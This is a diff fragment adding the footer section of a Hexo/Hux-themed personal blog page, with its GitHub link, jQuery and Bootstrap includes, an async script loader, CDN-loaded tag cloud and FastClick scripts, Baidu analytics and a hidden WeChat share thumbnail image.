+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2019 
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a> <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
